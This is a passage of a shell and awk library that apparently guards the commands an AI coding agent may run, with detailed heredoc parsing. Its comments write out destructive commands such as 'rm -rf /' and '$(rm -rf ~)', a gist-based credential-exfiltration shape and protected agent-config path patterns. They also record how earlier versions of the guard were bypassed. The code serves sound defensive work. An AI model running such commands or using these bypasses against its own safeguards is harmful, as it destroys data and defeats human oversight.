    _sargs="$(printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGA:${_sid}://p"
              printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGR:${_sid}:[^:]*://p")"
    # Each token ALSO in its canonical-path spelling, so a rule needs only the
    # absolute form and `~/.claude`, `$HOME/.claude` and `${HOME}/.claude` all
    # reach it. sed is line-oriented and every token is its own line, so this
    # cannot fuse two arguments into one.
    _sexp="$(floor_expand_paths "$_sargs")"
    if [ "$_sexp" != "$_sargs" ]; then _sargs="$_sargs
$_sexp"; fi
    _sok=1
    for _sre in "$@"; do
      if printf '%s\n' "$_sargs" | "$FLOOR_GREP" -Eq -- "$_sre"; then :; else _sok=0; break; fi
    done
    if [ "$_sok" = 1 ]; then return 0; fi
  done
  return 1
}

# floor_seg_cmd <cmd-ERE> — exit 0 iff some segment runs a matching command.
floor_seg_cmd() { floor_seg_has "$1"; }

# floor_seg_redir <cmd-ERE> <target-ERE> — exit 0 iff a matching segment
# REDIRECTS to a matching target. Distinct from floor_seg_has because "writes
# there" and "mentions it" are different claims: `grep -n patch ~/.claude/x`
# names the path and writes nothing.
# _floor_hd_one_opener <cmd> (harbor#803) — 0 iff line 1 is ONE simple command whose only
# redirect is ONE heredoc (fd duplications open no file), its terminator line is found, and
# only blank lines follow it. The table cannot say which line a segment came from.
_floor_hd_one_opener() {
  printf '%s\n' "$1" | awk '
    # NO APOSTROPHES IN THIS PROGRAM: it is a single-quoted shell string.
    NR == 1 {
      s = $0; L = length(s); p = 1; q = 0; nhd = 0
      while (p <= L) {
        c = substr(s, p, 1); nx = substr(s, p + 1, 1)
        if (q == 1) { if (c == "\047") q = 0; p++; continue }
        if (q == 2) {
          if (c == "\\") { p += 2; continue }
          if (c == "\"") q = 0
          else if (c == "`" || (c == "$" && (nx == "(" || nx == "["))) { bad = 1; exit }
          p++; continue
        }
        if (c == "\\") { if (p == L) { bad = 1; exit }; p += 2; continue }
        if (c == "\047") { q = 1; p++; continue }
        if (c == "\"") { q = 2; p++; continue }
        if (c ~ /[;|&()`]/ || (c == "$" && (nx == "(" || nx == "[" || nx == "\047"))) { bad = 1; exit }
        if (c == "#" && (p == 1 || substr(s, p - 1, 1) ~ /[ \t]/)) break
        if (c == "<" && nx == "<") {
          if (substr(s, p + 2, 1) == "<") { bad = 1; exit }
          nhd++; p += 2
          if (substr(s, p, 1) == "-") { DASH = 1; p++ }
          while (substr(s, p, 1) ~ /[ \t]/) p++
          dw = ""
          while (p <= L) {
            c = substr(s, p, 1)
            if (c ~ /[ \t;&|<>()]/) break
            if (c == "$" || c == "`") { bad = 1; exit }
            if (c == "\\") { dw = dw substr(s, p + 1, 1); p += 2; continue }
            if (c == "\047" || c == "\"") {
              k = index(substr(s, p + 1), c); if (k == 0) { bad = 1; exit }
              dw = dw substr(s, p + 1, k - 1); p += k + 1; continue
            }
            dw = dw c; p++
          }
          if (dw == "") { bad = 1; exit }
          DL = dw; continue
        }
        if (c == "<" || c == ">") {
          t = substr(s, p)
          if (match(t, /^[<>]&([0-9]+|-)([ \t]|$)/)) { p += RLENGTH; continue }
          bad = 1; exit
        }
        p++
      }
      if (q != 0 || nhd != 1) { bad = 1; exit }
      next
    }
    !T { x = $0; if (DASH) sub(/^\t+/, "", x); if (x == DL) T = NR; next }
    $0 !~ /^[ \t]*$/ { bad = 1; exit }
    END { exit ((bad || !T) ? 1 : 0) }'
}

# floor_heredoc_inert_only (harbor#89) — 0 iff the WHOLE command is one INERT
# command consuming a heredoc, and nothing else. Deliberately narrow.
#
# WHY IT EXISTS. Hours after the floor went live it blocked a `git commit` whose
# MESSAGE quoted a destructive command as evidence the rule now catches it, then
# blocked the issue filed about that, then blocked the attempt to inspect the
# tokenizer. This repo's discipline is detailed records of what was blocked and
# why, so the guard was taxing its own documentation.
#
# WHY NOT "IGNORE HEREDOC BODIES". A heredoc body is data to `git commit -F -`
# and EXECUTABLE to `sh`. The tokenizer folds newlines to `;`, so the body
# becomes its own segment with its own command word — measured:
#   git commit -F - <<EOF / <destructive> / EOF
#     SEGC:1:git  SEGR:1:<:EOF  SEGC:2:<verb>  SEGC:3:EOF
#   sh <<EOF / <destructive> / EOF
#     SEGC:1:sh   SEGR:1:<:EOF  SEGC:2:<verb>  SEGC:3:EOF
# Identical but for the consumer, which is exactly the signal.
#
# WHY SO STRICT. The obvious predicate — "every segment's command word is
# inert" — IS A BYPASS. `echo` is inert, so `echo x > <floor surface>` would
# satisfy it and the floor-surface write would be waved through: the danger is
# in the REDIRECT, not the command word. So this requires the command to be
# EXACTLY one inert consumer, the body, and the delimiter as the LAST segment.
# Anything after the delimiter — a second command, a redirect, an `&&` — and the
# veto does not fire and the flat rules decide as they do today.
#
# FAIL-CLOSED: no table, no heredoc, or an unrecognised consumer ⇒ return 1.
# The inert list is an ALLOWLIST. Enumerating dangerous words instead is what
# let every prefix wrapper through the egress veto's first draft.
#
# ── --publisher-inert (harbor#125) · INERTNESS IS TWO QUESTIONS ─────────────
# Both guards call this and they are not asking the same thing. guard-bash asks
# "could this body be EXECUTED, or written to disk here"; guard-egress asks
# "could this body LEAVE the box". `gh` answers NO to the first and emphatically
# YES to the second, and one flat allowlist cannot say that — which is
# harbor#90's diagnosis, reached again from the other side.
#
# The cost of the single list, measured 2026-08-22 against the installed floor:
#     gh issue create --title t --body-file - <<EOF … EOF     BLOCKED
#     git commit -F - <<EOF … EOF                            allowed
# Same body. Filing an issue whose text quotes a blocked shape is blocked;
# committing that text is not — the harbor#89 defect this function exists to
# fix, surviving in the sibling verb. Four of one session's blocks landed on
# documenting or measuring the floor rather than on any act against it.
#
# WHY THE SPLIT IS SAFE, and it rests on structure rather than on trust:
# guard-egress does NOT pass this flag, keeps the strict list, and judges the
# same command independently. `gh gist create - <<EOF <a credential path> EOF`
# still blocks there — floor-test pins it as HEREDOC-1e, and that arm is what
# caught an earlier attempt to add `gh` to the shared list. Handing the flag to
# guard-egress turns it red, which is the mutation that proves the split is
# load-bearing rather than cosmetic.
#
# THE SUBCOMMAND IS STILL CHECKED, because `gh` is not uniformly inert even for
# execution: `gh alias set` stores a shell expansion that a later `gh <alias>`
# runs — the deferred sink harbor#125 and #260 exist to close. The flag admits
# `gh` only for text-consuming verbs, `alias` is excluded by OMISSION rather
# than by a denylist, and an unrecognised verb falls through to today's
# behaviour.
floor_heredoc_inert_only() {
  [ -n "${FLOOR_SEGS:-}" ] && [ -n "${FLOOR_SEG_CMD:-}" ] || return 1
  case "$FLOOR_SEG_CMD" in *'<<'*) ;; *) return 1 ;; esac  # a builtin gate: no heredoc, no fork
  # harbor#798: an UNQUOTED delimiter expands the body (POSIX 2.7.4), so its $(…) and
  # backticks RUN; that body is code, and the caller must judge it.
  floor_hd_body_expands "$FLOOR_SEG_CMD" && return 1
  # harbor#803: nothing but the consumer on line 1, nothing but blank lines after the body.
  _floor_hd_one_opener "$FLOOR_SEG_CMD" || return 1
  _hipub=0
  case "${1:-}" in --publisher-inert) _hipub=1 ;; esac
  printf '%s\n' "$FLOOR_SEGS" | awk -v PUB="$_hipub" '
    BEGIN { split("echo printf git jq yq true false :", IV, " ") }
    # A SYNTHESIZED SEGMENT IS NOT A POSITION IN THE COMMAND (P13-fs-06). The
    # find -exec children floor-normalize.awk appends get ids ABOVE every parsed
    # segment, so "the delimiter must be the LAST segment" started comparing the
    # delimiter against a child that the heredoc body merely DESCRIBES. Measured:
    # a git commit -F - heredoc whose BODY spells the find -exec shape went from
    # exit 0 to exit 2 — a commit message documenting the shape this floor just
    # learned to block, which is the harbor#92 false positive exactly (a rule
    # taxing its own evidence).
    # Skipped rather than renumbered: ordering is what the fold and the emitter
    # depend on, and this predicate asks about the structure of the command.
    # NO APOSTROPHES IN THIS BLOCK. The awk program is a single-quoted shell
    # string, so one apostrophe inside a comment ENDS it and the rest of the
    # program is re-parsed by the shell. Not a style rule: the first draft of
    # this comment carried two, and the mangled program made this veto return 0 —
    # exiting guard-bash at its line 58 for a command it had never judged.
    # Measured both ways: floor-test.sh goes to 646 passed / 510 failed, so the
    # suite does catch it, and lint stays at 43 rules / 0 violations, so the lint
    # does not. A comment is the one place in this file where prose can break the
    # program, and the reviewer who adds the next line here will not be told.
    /^SEGF:/ { s = $0; sub(/^SEGF:/, "", s); sub(/:.*/, "", s); SYN[s + 0] = 1; next }
    # An eval body (harbor#786) is synthesized the same way, from a segment that
    # is itself a position: if that one follows the delimiter, the veto fails on it.
    /^SEGE:/ { s = $0; sub(/^SEGE:/, "", s); sub(/:.*/, "", s); SYN[s + 0] = 1; next }
    # So is a shell -c or env -S body (harbor#796); its parent on the opener line is refused
    # by the shape check, and after the terminator it is a parsed segment the veto fails on.
    /^SEGI:/ { s = $0; sub(/^SEGI:/, "", s); sub(/:.*/, "", s); SYN[s + 0] = 1; next }
    /^SEGC:/ {
      i = $0; sub(/^SEGC:/, "", i); n = i; sub(/:.*/, "", n)
      v = $0; sub(/^SEGC:[0-9]+:/, "", v)
      if (SYN[n + 0]) next
      C[n + 0] = v; if (n + 0 > MAX) MAX = n + 0
    }
    # Only a heredoc opened by the FIRST segment counts. A later one means the
    # command did something before it, and that something is not covered here.
    #
    # `<<`, NOT `<` (pass 13, TOK-heredoc-inert-01 — critical). The tokenizer used
    # to emit the same `SEGR:1:<:` row for a heredoc and for a plain input
    # redirect, so this predicate matched `jq . < README ; rm -rf / ; README`:
    # inert command word, a `<` redirect, and a last segment whose command word
    # equals the target. Every clause was satisfied by an ORDINARY read, and the
    # veto then exited guard-bash 0 with a "rm -rf /" sitting in the middle of the
    # command. Measured at rc=0 — a total bypass of the guard, reached with no
    # heredoc at all. floor-normalize.awk now distinguishes the two operators.
    /^SEGR:1:<<:/ { D = $0; sub(/^SEGR:1:<<:/, "", D) }
    /^SEGR:1:/ { R1++ }
    /^SEGW:1:/ { W1 = $0; sub(/^SEGW:1:/, "", W1) }
    # Segment 1 arguments, in order, for the publisher-inert subcommand check.
    /^SEGA:1:/ { a = $0; sub(/^SEGA:1:/, "", a); A[++AN] = a }
    END {
      if (D == "" || MAX < 2) exit 1
      # harbor#803: the first word IS the consumer (no assignment or wrapper configures
      # it), and its one redirect is the heredoc.
      if (W1 != C[1] || R1 != 1) exit 1
      w = C[1]; sub(/.*\//, "", w)
      ok = 0; for (k in IV) if (w == IV[k]) ok = 1
      # harbor#803: git is inert only for its document verbs, and never under -c,
      # --config-env or --exec-path, which choose what it runs. yq -i and -s write files.
      if (w == "git") {
        sc = ""
        for (q = 1; q <= AN; q++) {
          if (A[q] ~ /^(-c|--config-env|--exec-path)/) exit 1
          if (A[q] == "-C") { q++; continue }
          if (substr(A[q], 1, 1) == "-") continue
          sc = A[q]; break
        }
        if (sc !~ /^(commit|tag|notes)$/) exit 1
      }
      if (w == "yq") for (q = 1; q <= AN; q++) if (A[q] ~ /^(-[a-zA-Z]*[is]|--inplace|--split-exp)/) exit 1
      # A PUBLISHER IS INERT ONLY TO THE GUARD THAT DOES NOT JUDGE PUBLICATION,
      # and only for a verb that consumes text. The first non-flag argument is
      # the subcommand. NO APOSTROPHES IN THIS BLOCK: the awk program is a
      # single-quoted shell string and one apostrophe ends it.
      if (!ok && PUB == 1 && w == "gh") {
        split("issue pr release gist", PV, " ")
        for (q = 1; q <= AN; q++) {
          if (substr(A[q], 1, 1) == "-") continue
          for (r in PV) if (A[q] == PV[r]) ok = 1
          break
        }
      }
      if (!ok) exit 1
      # NOTHING FOLLOWS THE HEREDOC — decided on the RAW command by _floor_hd_one_opener
      # (harbor#803), not on the segment table. The old segment test "the last segment word
      # is the delimiter" (C[MAX] == D) read the body as shell, so a lone apostrophe in a
      # commit message opened a quote that swallowed the terminator, moved the last segment,
      # and turned the veto OFF for a quoted-delimiter body — the harbor#805 false positive.
      # _floor_hd_one_opener parses the body the way the shell does (quotes literal, terminator
      # by line), so it is apostrophe-safe and strictly covers what C[MAX]==D was for.
      exit 0
    }'
}

# floor_hd_drop_doc_bodies [--writers] <cmd> — <cmd> without the body of each LEADING
# document heredoc (harbor#716): the opener line is one simple command run by git
# commit|tag|notes, gh issue|pr|release|gist, jq, yq, echo, printf, true, false, :
# (and cat, tee with --writers). Anything else comes back unchanged. FLOOR.md has the rule.
floor_hd_drop_doc_bodies() {
  _hdbw=0; _hdbp=0
  while :; do
    case "${1:-}" in --writers) _hdbw=1; shift ;; --pipes) _hdbp=1; shift ;; *) break ;; esac
  done
  case "$1" in *'<<'*) ;; *) printf '%s' "$1"; return 0 ;; esac
  _hdbo="$(printf '%s\n' "$1" | awk -v W="$_hdbw" -v P="$_hdbp" '
    # NO APOSTROPHES IN THIS PROGRAM: it is a single-quoted shell string.
    function pushw() {
      if (inw) { if (rt) rt = 0; else WD[++NW] = cw }
      cw = ""; inw = 0
    }
    # harbor#302 --pipes: stage k (k >= 2) of the opener pipeline may only be a consumer whose
    # stdin cannot run: wc, head, tail, or gh/git on a document verb. Stage 1 is cat alone.
    function stage_ok(a, z,   k, sc) {
      if (WD[a] ~ /[\/=]/) return 0
      if (WD[a] ~ /^(wc|head|tail)$/) return 1
      if (WD[a] != "gh" && WD[a] != "git") return 0
      sc = ""
      for (k = a + 1; k <= z; k++) {
        if (WD[a] == "git" && WD[k] ~ /^(-c|--config-env|--exec-path|-C)/) return 0
        if (WD[a] == "git" && WD[k] ~ /^!/) return 0
        if (WD[k] ~ /^-/) continue
        sc = WD[k]; break
      }
      if (WD[a] == "git") return (sc ~ /^(commit|tag|notes)$/)
      return (sc ~ /^(issue|pr|release|gist)$/)
    }
    # 1 iff s is a strippable opener; sets DL (delimiter), DASH, OS and OE.
    function opener(s,   L, p, c, nx, q, nhd, dw, dq, k, sub1) {
      L = length(s); p = 1; q = 0; nhd = 0; NW = 0; cw = ""; inw = 0; rt = 0; NS = 0; hdst = 0
      split("", WD); split("", STG)
      while (p <= L) {
        c = substr(s, p, 1); nx = substr(s, p + 1, 1)
        if (q == 1) { if (c == "\047") q = 0; else cw = cw c; p++; continue }
        if (q == 2) {
          if (c == "\\" && nx ~ /[$`"\\]/) { cw = cw nx; p += 2; continue }
          if (c == "\"") { q = 0; p++; continue }
          if (c == "`" || (c == "$" && nx == "(")) return 0
          cw = cw c; p++; continue
        }
        if (c == "\\") { if (p == L) return 0; cw = cw nx; inw = 1; p += 2; continue }
        if (c == "\047") { q = 1; inw = 1; p++; continue }
        if (c == "\"") { q = 2; inw = 1; p++; continue }
        if (c == "`" || c == "(" || c == ")" || c == ";") return 0
        if (c == "$" && nx == "(") return 0
        if (c == "#" && !inw) break
        if (c == " " || c == "\t") { pushw(); p++; continue }
        if (c == "|") {
          if (!P || nx == "|" || nx == "&") return 0
          pushw(); STG[++NS] = NW + 1; p++; continue
        }
        if (c == "&" && nx != ">") return 0
        if (c == "<" && substr(s, p, 3) == "<<<") return 0
        if (c == "<" && nx == "<") {
          pushw(); nhd++; OS = p; hdst = NS; p += 2; DASH = 0
          if (substr(s, p, 1) == "-") { DASH = 1; p++ }
          while (substr(s, p, 1) == " " || substr(s, p, 1) == "\t") p++
          dw = ""; dq = 0
          while (p <= L) {
            c = substr(s, p, 1); nx = substr(s, p + 1, 1)
            if (dq == 1) { if (c == "\047") dq = 0; else dw = dw c; p++; continue }
            if (dq == 2) {
              if (c == "\\" && nx ~ /[$`"\\]/) { dw = dw nx; p += 2; continue }
              if (c == "\"") dq = 0; else dw = dw c
              p++; continue
            }
            if (c == "\047") { dq = 1; p++; continue }
            if (c == "\"") { dq = 2; p++; continue }
            if (c == "\\") { if (p == L) return 0; dw = dw nx; p += 2; continue }
            if (c ~ /[ \t;&|<>()]/) break
            if (c == "`" || (c == "$" && nx == "(")) return 0
            dw = dw c; p++
          }
          if (dq != 0 || dw == "") return 0
          DL = dw; OE = p - 1; continue
        }
        if (P && (c == ">" || c == "<" || c == "&")) return 0
        if (c == ">" || c == "<" || c == "&") {
          # a redirect: a bare fd number before it is part of the operator,
          # and the word after it is its target, never a command word
          if (inw && cw ~ /^[0-9]+$/) { cw = ""; inw = 0 } else pushw()
          while (p <= L && substr(s, p, 1) ~ /[<>&|]/) p++
          rt = 1; continue
        }
        cw = cw c; inw = 1; p++
      }
      if (q != 0) return 0
      pushw()
      if (nhd != 1 || NW == 0) return 0
      if (P) {
        if (NS == 0 || hdst != 0 || WD[1] != "cat") return 0
        for (k = 1; k <= NS; k++) {
          if (STG[k] > NW || !stage_ok(STG[k], (k < NS) ? STG[k + 1] - 1 : NW)) return 0
        }
        return 1
      }
      c = WD[1]
      if (c ~ /[\/=]/) return 0
      if (c ~ /^(jq|yq|echo|printf|true|false|:)$/) return 1
      if (c ~ /^(cat|tee)$/) return (W == 1)
      sub1 = ""
      for (k = 2; k <= NW; k++) {
        if (c == "git" && WD[k] == "-C") { k++; continue }
        if (c == "git" && WD[k] ~ /^(-c|--config-env|--exec-path)/) return 0
        if (WD[k] ~ /^-/) continue
        sub1 = WD[k]; break
      }
      if (c == "git") {
        for (k = 2; k <= NW; k++) if (WD[k] ~ /^!/) return 0
        return (sub1 ~ /^(commit|tag|notes)$/)
      }
      if (c == "gh") return (sub1 ~ /^(issue|pr|release|gist)$/)
      return 0
    }
    { LN[++N] = $0 }
    END {
      i = 1; o = ""; sep = ""
      while (i <= N) {
        if (LN[i] == "") { o = o sep; sep = "\n"; i++; continue }
        if (!opener(LN[i])) break
        t = 0
        for (j = i + 1; j <= N; j++) {
          x = LN[j]; if (DASH) sub(/^\t+/, "", x)
          if (x == DL) { t = j; break }
        }
        if (!t) break
        o = o sep substr(LN[i], 1, OS - 1) " " substr(LN[i], OE + 1); sep = "\n"
        i = t + 1
      }
      for (; i <= N; i++) { o = o sep LN[i]; sep = "\n" }
      printf "%s", o
    }' 2>/dev/null)" || _hdbo=""
  if [ -n "$_hdbo" ]; then printf '%s' "$_hdbo"; else printf '%s' "$1"; fi
}

# floor_hd_unwrap_doc_bodies [--writers] <cmd> — like floor_hd_drop_doc_bodies, but
# also drops the body of a document heredoc that sits behind ONE envelope
# (harbor#782): a compound opener (`mkdir … && cat > f <<EOF`) or the
# `<enclosing> … $(cat <<EOF)` argument form, which is how commits and PR bodies
# are written here. Self-contained: it only PEELS the envelope off line 1 and then
# delegates the delicate heredoc parsing to floor_hd_drop_doc_bodies, so both
# consumer/interpreter safety and the leading case stay in one place. FLOOR.md has
# the rule.
#
# WHY THE ENVELOPE IS SAFE TO PEEL. A compound prefix runs before the consumer and
# never touches the body; the consumer that owns the heredoc is re-checked by the
# delegate, so `x && bash <<EOF` is left judged. A `$(cat <<EOF)` prints the body
# and its OUTPUT becomes an argument — harmless to a doc consumer or a
# git/gh publish, executable to a shell — so the substitution arm peels ONLY when
# the enclosing command word is on that allowlist, which is why `sh -c "$(…)"` and
# `eval "$(…)"` are never peeled and keep blocking. A mis-split leaves an
# unbalanced remainder the delegate refuses, so every ambiguous case fails toward
# keeping the body judged.
floor_hd_unwrap_doc_bodies() {
  _huw=0
  if [ "${1:-}" = --writers ]; then _huw=1; shift; fi
  _hu="$1"
  case "$_hu" in *'<<'*) ;; *) printf '%s' "$_hu"; return 0 ;; esac
  # A body the shell expands and runs is code, never a document (see below).
  if floor_hd_body_expands "$_hu"; then printf '%s' "$_hu"; return 0; fi
  # A LEADING document heredoc is the delegate's own case; if it strips, we are done.
  if [ "$_huw" = 1 ]; then _hul="$(floor_hd_drop_doc_bodies --writers "$_hu")"
  else _hul="$(floor_hd_drop_doc_bodies "$_hu")"; fi
  [ "$_hul" = "$_hu" ] || { printf '%s' "$_hul"; return 0; }
  [ -f "$FLOOR_AWK" ] || { printf '%s' "$_hu"; return 0; }
  # Classify line 1 and emit the split. Both fields are single lines (line 1 only).
  _husp="$(printf '%s\n' "$_hu" | _HU_W="$_huw" awk -v W="$_huw" '
    # NO APOSTROPHES IN THIS PROGRAM: it is a single-quoted shell string.
    function firstword(s,   i, c, q, w) {
      q = 0; w = ""
      for (i = 1; i <= length(s); i++) {
        c = substr(s, i, 1)
        if (q == 1) { if (c == "\047") q = 0; else w = w c; continue }
        if (q == 2) { if (c == "\"") q = 0; else w = w c; continue }
        if (c == "\047") { q = 1; continue }
        if (c == "\"") { q = 2; continue }
        if (c == " " || c == "\t") { if (w != "") return w; else continue }
        w = w c
      }
      return w
    }
    function consumer_first(w) {
      sub(/.*\//, "", w)
      return (w ~ /^(jq|yq|echo|printf|true|false|:)$/) || (W == 1 && w ~ /^(cat|tee)$/)
    }
    NR == 1 {
      L = $0; n = length(L)
      fw = firstword(L); fwb = fw; sub(/.*\//, "", fwb)
      q1 = 0; depth = 0; hd0 = 0; hdsub = 0; lastsep = 0; subpos = 0; PIPE = 0; i = 1
      while (i <= n) {
        c = substr(L, i, 1); nx = substr(L, i + 1, 1)
        if (q1 == 1) { if (c == "\047") q1 = 0; i++; continue }
        if (c == "\047") { q1 = 1; i++; continue }
        if (c == "\\") { i += 2; continue }
        if (c == "$" && nx == "(") { if (depth == 0 && subpos == 0 && hd0 == 0) subpos = i + 2; depth++; i += 2; continue }
        if (c == "(") { depth++; i++; continue }
        if (c == ")") { if (depth > 0) depth--; i++; continue }
        if (c == "<" && substr(L, i, 3) == "<<<") { i += 3; continue }
        if (c == "<" && nx == "<") {
          if (depth == 0) { if (hd0 == 0) hd0 = i } else { if (subpos > 0 && hdsub == 0) hdsub = i }
          i += 2; continue
        }
        if (depth == 0) {
          if (c == "|" && nx == "|") { lastsep = i + 2; i += 2; continue }
          if (c == "|") { PIPE = 1; i++; continue }
          if (c == "&" && nx == "&") { lastsep = i + 2; i += 2; continue }
          if (c == "&") { i++; continue }
          if (c == ";") { lastsep = i + 1; i++; continue }
        }
        i++
      }
      if (hd0 > 0 && lastsep > 0 && lastsep < hd0 && !PIPE && subpos == 0) {
        printf "PFX:%s\n", substr(L, 1, lastsep); printf "RL1:%s\n", substr(L, lastsep + 1); next
      }
      if (subpos > 0 && hdsub > 0 && !PIPE) {
        ok = consumer_first(fw)
        if (!ok && fwb == "git") { if (L ~ /(^|[^[:alnum:]_])git([[:space:]]+-[^[:space:]]+)*[[:space:]]+(commit|tag|notes)([[:space:]]|$)/) ok = 1 }
        if (!ok && fwb == "gh")  { if (L ~ /(^|[^[:alnum:]_])gh([[:space:]]+-[^[:space:]]+)*[[:space:]]+(issue|pr|release|gist)([[:space:]]|$)/) ok = 1 }
        if (ok) { printf "PFX:%s\n", substr(L, 1, subpos - 1); printf "RL1:%s\n", substr(L, subpos); next }
      }
    }' 2>/dev/null || true)"
  case "$_husp" in PFX:*) ;; *) printf '%s' "$_hu"; return 0 ;; esac
  _hupfx="$(printf '%s\n' "$_husp" | sed -n 's/^PFX://p')"
  _hurl1="$(printf '%s\n' "$_husp" | sed -n 's/^RL1://p')"
  _hutail="$(printf '%s' "$_hu" | sed '1d')"
  if [ -n "$_hutail" ]; then _hurem="$_hurl1
$_hutail"; else _hurem="$_hurl1"; fi
  if [ "$_huw" = 1 ]; then _hustr="$(floor_hd_drop_doc_bodies --writers "$_hurem")"
  else _hustr="$(floor_hd_drop_doc_bodies "$_hurem")"; fi
  [ "$_hustr" != "$_hurem" ] || { printf '%s' "$_hu"; return 0; }
  printf '%s%s' "$_hupfx" "$_hustr"
}

# floor_hd_doc_view <cmd> — <cmd> with the body of a document heredoc dropped where the
# consumer is behind a PIPE (`cat <<'EOF' | gh issue create --body-file -`) or inside a
# `$( )` that is an argument of git/gh (harbor#302). Anything not provably a document comes
# back unchanged, so the flat and argv layers keep judging it: a floor surface named anywhere,
# an unquoted delimiter whose body expands, an output redirect on line 1, any later stage that
# is not a stdin-inert reader, and a `)` that is not the last thing in the command.
floor_hd_doc_view() {
  _dv="$1"
  case "$_dv" in *'<<'*) ;; *) printf '%s' "$_dv"; return 0 ;; esac
  case "$_dv" in *.claude*|*settings.json*|*hooks/*|*.git/*|*CLAUDE.md*) printf '%s' "$_dv"; return 0 ;; esac
  if floor_hd_body_expands "$_dv"; then printf '%s' "$_dv"; return 0; fi
  _dv1="${_dv%%
*}"
  case "$_dv1" in *'>'*) printf '%s' "$_dv"; return 0 ;; esac
  case "$_dv1" in
    *'|'*) _dvo="$(floor_hd_drop_doc_bodies --pipes "$_dv")" ;;
    *'$(cat <<'*)
      # The enclosing command's output goes nowhere else: `)` (and its quote) must END the command.
      _dvl="$(printf '%s\n' "$_dv" | awk 'NF { l = $0 } END { print l }')"
      case "$_dvl" in
        ')'|')"'|")'") _dvo="$(floor_hd_unwrap_doc_bodies --writers "$_dv")" ;;
        *) _dvo="$_dv" ;;
      esac ;;
    *) _dvo="$_dv" ;;
  esac
  printf '%s' "$_dvo"
}

# floor_hd_body_expands <cmd> — 0 iff some heredoc with an UNQUOTED delimiter has a
# body carrying `$(`, a backtick, `$[` or `${` (harbor#782). POSIX expands such a
# body while building the heredoc, so `git commit -F - <<EOF` / `$(<cmd>)` / `EOF`
# RUNS <cmd>: that body is code, and no body-dropping may hide it. Double quotes
# are not tracked, so a `<<` inside one can only add a match (fail toward judging).
floor_hd_body_expands() {
  case "$1" in *'<<'*) ;; *) return 1 ;; esac
  printf '%s\n' "$1" | awk '
    # NO APOSTROPHES IN THIS PROGRAM: it is a single-quoted shell string.
    # Queue every heredoc opened on a command line, then read bodies in order.
    function scan(s,   n, i, c, nx, q1, dw, dq, dash) {
      n = length(s); q1 = 0; i = 1
      while (i <= n) {
        c = substr(s, i, 1); nx = substr(s, i + 1, 1)
        if (q1) { if (c == "\047") q1 = 0; i++; continue }
        if (c == "\047") { q1 = 1; i++; continue }
        if (c == "\\") { i += 2; continue }
        if (c == "<" && substr(s, i, 3) == "<<<") { i += 3; continue }
        if (c == "<" && nx == "<") {
          i += 2; dash = 0
          if (substr(s, i, 1) == "-") { dash = 1; i++ }
          while (substr(s, i, 1) ~ /[ \t]/) i++
          dw = ""; dq = 0
          while (i <= n) {
            c = substr(s, i, 1)
            if (c ~ /[ \t;&|<>()]/) break
            if (c == "\047" || c == "\"" || c == "\\") { dq = 1; i++; continue }
            dw = dw c; i++
          }
          if (dw != "") { NQ++; QD[NQ] = dw; QQ[NQ] = dq; QT[NQ] = dash }
          continue
        }
        i++
      }
    }
    {
      if (HEAD <= NQ && HEAD > 0) {
        x = $0; if (QT[HEAD]) sub(/^\t+/, "", x)
        if (x == QD[HEAD]) { HEAD++; if (HEAD > NQ) HEAD = 0; next }
        if (!QQ[HEAD] && ($0 ~ /\$[([{]/ || index($0, "`"))) { hit = 1; exit }
        next
      }
      before = NQ; scan($0)
      if (NQ > before) HEAD = before + 1
    }
    END { exit (hit ? 0 : 1) }'
}

# floor_hd_literalize_bodies <cmd> — <cmd> with every apostrophe and double quote INSIDE a
# heredoc body replaced by a space (harbor#805). A heredoc body is not quote-parsed by the
# shell, so those characters are literal there; but the normalizer reads the whole command as
# one shell string with no heredoc awareness, so a lone `'` in a commit message opened a quote
# that ran past the terminator and hid the body's own `$(…)` from extraction — measured:
# `git commit -F - <<EOF` / `it's $(rm -rf ~)` / `EOF` reached exit 0 while the same body
# without the apostrophe blocked. Command substitutions, backticks and `${`/`$[` are LEFT
# intact, so an unquoted body that runs one is still judged; opener lines and everything
# outside a body are untouched, so real syntax (`git commit -m "$(cat <<EOF`) is unchanged.
# The veto reads the ORIGINAL (FLOOR_SEG_CMD), so delimiter quoting is detected as written.
floor_hd_literalize_bodies() {
  case "$1" in *'<<'*) ;; *) printf '%s' "$1"; return 0 ;; esac
  _hlb="$(printf '%s\n' "$1" | awk '
    # NO APOSTROPHES IN THIS PROGRAM: it is a single-quoted shell string.
    # scan(s) queues each heredoc opened on command line s and returns 1 iff s ends with its
    # quotes balanced and no trailing backslash — i.e. the logical line ended here, so the body
    # starts on the next physical line. A `<<x` inside "..." is not an opener (quote-aware).
    function scan(s,   n, i, c, nx, q1, dw, dash) {
      n = length(s); q1 = 0; i = 1
      while (i <= n) {
        c = substr(s, i, 1); nx = substr(s, i + 1, 1)
        if (q1) {
          if (c == "\\" && q1 == 2) { i += 2; continue }   # \" inside "..." does not close it
          if (c == "\047" && q1 == 1) q1 = 0; else if (c == "\"" && q1 == 2) q1 = 0
          i++; continue
        }
        if (c == "\047") { q1 = 1; i++; continue }
        if (c == "\"") { q1 = 2; i++; continue }
        if (c == "\\") { if (i == n) return -1; i += 2; continue }
        if (c == "<" && substr(s, i, 3) == "<<<") { i += 3; continue }
        if (c == "<" && nx == "<") {
          i += 2; dash = 0
          if (substr(s, i, 1) == "-") { dash = 1; i++ }
          while (substr(s, i, 1) ~ /[ \t]/) i++
          dw = ""
          while (i <= n) {
            c = substr(s, i, 1)
            if (c ~ /[ \t;&|<>()]/) break
            if (c == "\047" || c == "\"" || c == "\\") { i++; continue }
            dw = dw c; i++
          }
          if (dw != "") { NQ++; QD[NQ] = dw; QT[NQ] = dash }
          continue
        }
        i++
      }
      return (q1 == 0) ? 1 : -1
    }
    { L[NR] = $0 }
    END {
      out = ""; sep = ""; i = 1
      while (i <= NR) {
        # Read the bodies of every heredoc queued on the logical line just scanned, in order.
        if (HEAD > 0 && HEAD <= NQ) {
          x = L[i]; if (QT[HEAD]) sub(/^\t+/, "", x)
          if (x == QD[HEAD]) { HEAD++; if (HEAD > NQ) HEAD = 0; out = out sep L[i]; sep = "\n"; i++; continue }
          y = L[i]; gsub(/[\047"]/, " ", y)   # a body line: quotes are literal here
          out = out sep y; sep = "\n"; i++; continue
        }
        # A command/opener line. If its quotes do not balance here (the logical line continues
        # onto the next physical line, e.g. an open quote past a heredoc opener — harbor#784),
        # body boundaries are ambiguous, so leave the WHOLE command untouched.
        before = NQ; bal = scan(L[i])
        if (bal != 1) { print_original(); exit }
        out = out sep L[i]; sep = "\n"; i++
        if (NQ > before) HEAD = before + 1
      }
      if (HEAD > 0) { print_original(); exit }   # a body with no terminator: untouched
